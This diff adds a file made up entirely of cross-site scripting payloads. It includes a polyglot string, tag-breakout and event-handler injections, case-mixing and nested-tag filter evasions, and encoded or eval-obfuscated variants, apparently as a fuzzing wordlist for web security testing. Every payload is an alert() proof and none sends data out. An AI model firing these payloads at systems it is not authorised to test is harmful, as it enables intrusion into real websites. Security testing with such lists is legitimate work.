@@ -1,0 +1,37 @@
+jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//\x3e
+"><img src=x onerror=alert(1)//<
+'><img src=x onerror=alert(1)//'
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+--><script>alert(1)</script>
+]]><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<math><mtext></title><script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<script>al\u0065rt(1)</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3cscript%3ealert(1)%3c/script%3e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&lt;script&gt;alert(1)&lt;/script&gt;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1)//<</script>
+javascript:alert(1)
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
